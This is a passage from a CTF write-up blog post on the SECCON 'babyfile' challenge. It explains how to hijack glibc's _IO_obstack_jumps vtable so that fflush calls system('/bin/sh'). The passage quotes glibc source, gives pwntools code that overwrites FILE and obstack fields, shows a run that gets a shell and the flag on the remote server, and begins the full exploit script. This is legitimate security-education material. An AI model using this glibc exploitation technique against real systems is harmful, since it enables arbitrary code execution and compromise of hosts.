<span class="n">heap</span> <span class="o">=</span> <span class="n">leak_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">leak_main_arena</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x2a0</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="obstack-exploitation">
        obstack exploitation
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#obstack-exploitation" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor obstack exploitation" href="#obstack-exploitation">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>As far I know, <code>obstack</code> has never been used in CTF even though it can be leveraged as a very good call primitive (and as said before it needs a heap and libc to be used). Basically, the <code>_IO_obstack_jumps</code> vtable looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* the jump table.  */</span>
<span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_obstack_jumps</span> <span class="n">libio_vtable</span> <span class="n">attribute_hidden</span> <span class="o">=</span>
<span class="p">{</span>
    <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_obstack_overflow</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_obstack_xsputn</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">showmanyc</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">),</span>
    <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">imbue</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
<span class="p">};</span>
</code></pre></div><p>Given when <code>_IO_SYNC</code> is called in <code>_IO_fflush</code> the second argument is <code>0x1</code>, we cannot call functions like <code>_IO_obstack_xsputn</code> that need buffer as arguments, that&rsquo;s the reason why we have to dig into <code>_IO_obstack_overflow</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">static</span> <span class="kt">int</span>
<span class="nf">_IO_obstack_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span> <span class="o">=</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_obstack_file</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">obstack</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>

  <span class="cm">/* Make room for another character.  This might as well allocate a
</span><span class="cm">     new chunk a memory and moves the old contents over.  */</span>
  <span class="n">assert</span> <span class="p">(</span><span class="n">c</span> <span class="o">!=</span> <span class="n">EOF</span><span class="p">);</span>
  <span class="n">obstack_1grow</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">c</span><span class="p">);</span>

  <span class="cm">/* Setup the buffer pointers again.  */</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">obstack_base</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">obstack_next_free</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
  <span class="n">size</span> <span class="o">=</span> <span class="n">obstack_room</span> <span class="p">(</span><span class="n">obstack</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
  <span class="cm">/* Now allocate the rest of the current chunk.  */</span>
  <span class="n">obstack_blank_fast</span> <span class="p">(</span><span class="n">obstack</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>

  <span class="k">return</span> <span class="n">c</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The <code>struct _IO_obstack_file</code> is defined as follows:

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="01729ed5-16">
    <span>struct _IO_obstack_file</span>
    <span>...</span>
  </label>
  <input id="01729ed5-16" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">_IO_obstack_file</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">obstack</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>
  </div>
</div>
</p>
<p>Which means right after the <code>vtable</code> field within the file stream should be a pointer toward a <code>struct obstack</code>.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="b4a5bff5-17">
    <span>struct obstack</span>
    <span>...</span>
  </label>
  <input id="b4a5bff5-17" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">obstack</span>          <span class="cm">/* control current object in current chunk */</span>
<span class="p">{</span>
  <span class="kt">long</span> <span class="n">chunk_size</span><span class="p">;</span>              <span class="cm">/* preferred size to allocate chunks in */</span>
  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">chunk</span><span class="p">;</span> <span class="cm">/* address of current struct obstack_chunk */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>            <span class="cm">/* address of object we are building */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">next_free</span><span class="p">;</span>              <span class="cm">/* where to add next char to current object */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">chunk_limit</span><span class="p">;</span>            <span class="cm">/* address of char after current chunk */</span>
  <span class="k">union</span>
  <span class="p">{</span>
    <span class="n">PTR_INT_TYPE</span> <span class="n">tempint</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">tempptr</span><span class="p">;</span>
  <span class="p">}</span> <span class="n">temp</span><span class="p">;</span>                       <span class="cm">/* Temporary for some macros.  */</span>
  <span class="kt">int</span> <span class="n">alignment_mask</span><span class="p">;</span>           <span class="cm">/* Mask of alignment for each object. */</span>
  <span class="cm">/* These prototypes vary based on &#39;use_extra_arg&#39;, and we use
</span><span class="cm">     casts to the prototypeless function type in all assignments,
</span><span class="cm">     but having prototypes here quiets -Wstrict-prototypes.  */</span>
  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">(</span><span class="o">*</span><span class="n">chunkfun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="kt">long</span><span class="p">);</span>
  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">freefun</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="p">);</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">extra_arg</span><span class="p">;</span>              <span class="cm">/* first arg for chunk alloc/dealloc funcs */</span>
  <span class="kt">unsigned</span> <span class="nl">use_extra_arg</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>     <span class="cm">/* chunk alloc/dealloc funcs take extra arg */</span>
  <span class="kt">unsigned</span> <span class="nl">maybe_empty_object</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span> <span class="cm">/* There is a possibility that the current
</span><span class="cm">				      chunk contains a zero-length object.  This
</span><span class="cm">				      prevents freeing the chunk if we allocate
</span><span class="cm">				      a bigger chunk to replace it. */</span>
  <span class="kt">unsigned</span> <span class="nl">alloc_failed</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>      <span class="cm">/* No longer used, as we now call the failed
</span><span class="cm">				     handler on error, but retained for binary
</span><span class="cm">				     compatibility.  */</span>
<span class="p">};</span>
</code></pre></div>
  </div>
</div>

<p>Once <code>obstack_1grow</code> is called, if <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>, <code>_obstack_newchunk</code> gets called.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="dbb51532-18">
    <span>obstack_1grow</span>
    <span>...</span>
  </label>
  <input id="dbb51532-18" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp"># define obstack_1grow(OBSTACK, datum)					      \
</span><span class="cp">  __extension__								      \
</span><span class="cp">    ({ struct obstack *__o = (OBSTACK);				      \
</span><span class="cp">       if (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)			      \
</span><span class="cp">	 _obstack_newchunk (__o, 1);					      \
</span><span class="cp">       obstack_1grow_fast (__o, datum);				      \
</span><span class="cp">       (void) 0; })
</span></code></pre></div>
  </div>
</div>

<p><strong>Condition</strong>: <code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code>.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="f89e64e3-19">
    <span>_obstack_newchunk</span>
    <span>...</span>
  </label>
  <input id="f89e64e3-19" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/* Allocate a new current chunk for the obstack *H
</span><span class="cm">   on the assumption that LENGTH bytes need to be added
</span><span class="cm">   to the current object, or a new object of length LENGTH allocated.
</span><span class="cm">   Copies any partial object from the end of the old chunk
</span><span class="cm">   to the beginning of the new one.  */</span>

<span class="kt">void</span>
<span class="nf">_obstack_newchunk</span> <span class="p">(</span><span class="k">struct</span> <span class="n">obstack</span> <span class="o">*</span><span class="n">h</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">old_chunk</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_obstack_chunk</span> <span class="o">*</span><span class="n">new_chunk</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">new_size</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">obj_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">next_free</span> <span class="o">-</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">i</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">already</span><span class="p">;</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">object_base</span><span class="p">;</span>

  <span class="cm">/* Compute size for new chunk.  */</span>
  <span class="n">new_size</span> <span class="o">=</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">+</span> <span class="n">length</span><span class="p">)</span> <span class="o">+</span> <span class="p">(</span><span class="n">obj_size</span> <span class="o">&gt;&gt;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span> <span class="o">+</span> <span class="mi">100</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">)</span>
    <span class="n">new_size</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_size</span><span class="p">;</span>

  <span class="cm">/* Allocate and initialize the new chunk.  */</span>
  <span class="n">new_chunk</span> <span class="o">=</span> <span class="n">CALL_CHUNKFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">new_size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new_chunk</span><span class="p">)</span>
    <span class="p">(</span><span class="o">*</span><span class="n">obstack_alloc_failed_handler</span><span class="p">)();</span>
  <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk</span> <span class="o">=</span> <span class="n">new_chunk</span><span class="p">;</span>
  <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">old_chunk</span><span class="p">;</span>
  <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">limit</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">chunk_limit</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_chunk</span> <span class="o">+</span> <span class="n">new_size</span><span class="p">;</span>

  <span class="cm">/* Compute an aligned object_base in the new chunk */</span>
  <span class="n">object_base</span> <span class="o">=</span>
    <span class="n">__PTR_ALIGN</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">new_chunk</span><span class="p">,</span> <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">contents</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span><span class="p">);</span>

  <span class="cm">/* Move the existing object to the new chunk.
</span><span class="cm">     Word at a time is fast and is safe if the object
</span><span class="cm">     is sufficiently aligned.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&gt;=</span> <span class="n">DEFAULT_ALIGNMENT</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">obj_size</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
	   <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
	<span class="p">((</span><span class="n">COPYING_UNIT</span> <span class="o">*</span><span class="p">)</span> <span class="n">object_base</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span>
	  <span class="o">=</span> <span class="p">((</span><span class="n">COPYING_UNIT</span> <span class="o">*</span><span class="p">)</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">)[</span><span class="n">i</span><span class="p">];</span>
      <span class="cm">/* We used to copy the odd few remaining bytes as one extra COPYING_UNIT,
</span><span class="cm">	 but that can cross a page boundary on a machine
</span><span class="cm">	 which does not do strict alignment for COPYING_UNITS.  */</span>
      <span class="n">already</span> <span class="o">=</span> <span class="n">obj_size</span> <span class="o">/</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">COPYING_UNIT</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="k">else</span>
    <span class="n">already</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="cm">/* Copy remaining bytes one by one.  */</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="n">already</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">obj_size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="n">object_base</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

  <span class="cm">/* If the object just copied was the only data in OLD_CHUNK,
</span><span class="cm">     free that chunk and remove it from the chain.
</span><span class="cm">     But not if that chunk might contain an empty object.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">maybe_empty_object</span>
      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span>
	  <span class="o">==</span> <span class="n">__PTR_ALIGN</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">old_chunk</span><span class="p">,</span> <span class="n">old_chunk</span><span class="o">-&gt;</span><span class="n">contents</span><span class="p">,</span>
			  <span class="n">h</span><span class="o">-&gt;</span><span class="n">alignment_mask</span><span class="p">)))</span>
    <span class="p">{</span>
      <span class="n">new_chunk</span><span class="o">-&gt;</span><span class="n">prev</span> <span class="o">=</span> <span class="n">old_chunk</span><span class="o">-&gt;</span><span class="n">prev</span><span class="p">;</span>
      <span class="n">CALL_FREEFUN</span> <span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="n">old_chunk</span><span class="p">);</span>
    <span class="p">}</span>

  <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span> <span class="o">=</span> <span class="n">object_base</span><span class="p">;</span>
  <span class="n">h</span><span class="o">-&gt;</span><span class="n">next_free</span> <span class="o">=</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">object_base</span> <span class="o">+</span> <span class="n">obj_size</span><span class="p">;</span>
  <span class="cm">/* The new chunk certainly contains no empty object yet.  */</span>
  <span class="n">h</span><span class="o">-&gt;</span><span class="n">maybe_empty_object</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp"># ifdef _LIBC
</span><span class="cp"></span><span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_obstack_newchunk</span><span class="p">)</span>
<span class="cp"># endif
</span></code></pre></div>
  </div>
</div>

<p>The interesting part of the function is the call to the <code>CALL_CHUNKFUN</code> macro that calls a raw <em>unencrypted</em> function pointer referenced by the <code>obstack</code> structure with either a controlled argument (<code>(h)-&gt;extra_arg</code>) or only with the size.</p>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="548d28af-20">
    <span>CALL_FREEFUN</span>
    <span>...</span>
  </label>
  <input id="548d28af-20" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp"># define CALL_FREEFUN(h, old_chunk) \
</span><span class="cp">  do { \
</span><span class="cp">      if ((h)-&gt;use_extra_arg)						      \
</span><span class="cp">	(*(h)-&gt;freefun)((h)-&gt;extra_arg, (old_chunk));			      \
</span><span class="cp">      else								      \
</span><span class="cp">	(*(void (*)(void *))(h)-&gt;freefun)((old_chunk));		      \
</span><span class="cp">    } while (0)
</span></code></pre></div>
  </div>
</div>

<p>If I summarize, to call <code>system(&quot;/bin/sh&quot;</code> we need to have:</p>
<ul>
<li><code>__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit</code></li>
<li><code>(h)-&gt;freefun</code> = <code>&amp;system</code></li>
<li><code>(h)-&gt;extra_arg</code> = <code>&amp;&quot;/bin/sh&quot;</code></li>
<li><code>(h)-&gt;use_extra_arg</code> != 0</li>
</ul>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">_IO_obstack_jumps</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="mh">0x1E9260</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_IO_obstack_jumps: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="c1"># edit vtable =&gt; _IO_obstack_jumps</span>
<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_obstack_jumps</span> <span class="o">-</span> <span class="mi">8</span> <span class="o">*</span> <span class="mi">9</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">obstack</span><span class="p">)</span>

<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xff</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">_IO_read_base</span><span class="p">)</span>

<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">chunkfun</span><span class="p">)</span> <span class="c1"># fn ptr, system</span>
<span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">extra_arg</span><span class="p">)</span> <span class="c1"># arg</span>
<span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="kc">True</span><span class="p">),</span> <span class="n">obstack</span><span class="o">.</span><span class="n">use_extra_arg</span><span class="p">)</span>

<span class="n">fflush</span><span class="p">()</span>
<span class="c1"># system(&#34;/bin/sh&#34;)</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="profit">
        PROFIT
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor PROFIT" href="#profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>After optimizing a lot my exploit (my french connection sucks), here we are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/seccon/babyfile$ <span class="nb">time</span> python3 exploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>babyfile.seccon.games <span class="nv">PORT</span><span class="o">=</span><span class="m">3157</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/seccon/babyfile/chall&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+<span class="o">]</span> Opening connection to babyfile.seccon.games on port 3157: Done
<span class="o">[</span>*<span class="o">]</span> libc: 0x7fe2bc538000
<span class="o">[</span>*<span class="o">]</span> heap: 0x55fd27776000
<span class="o">[</span>*<span class="o">]</span> _IO_obstack_jumps: 0x7fe2bc721260
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
SECCON<span class="o">{</span>r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3<span class="o">}</span>
<span class="o">[</span>*<span class="o">]</span> Got EOF <span class="k">while</span> reading in interactive
$
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="annexes">
        Annexes
        <a data-clipboard-text="https://nasm.re/posts/babyfile/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>

<div class="gblog-expand">
  <label class="gblog-expand__head flex justify-between" for="549f44b0-21">
    <span>Full exploit code</span>
    <span>...</span>
  </label>
  <input id="549f44b0-21" type="checkbox" class="gblog-expand__control hidden" />
  <div class="gblog-markdown--nested gblog-expand__content">
    <p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;chall&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-2.31.so&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="c1"># pwn.context.timeout = 1000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
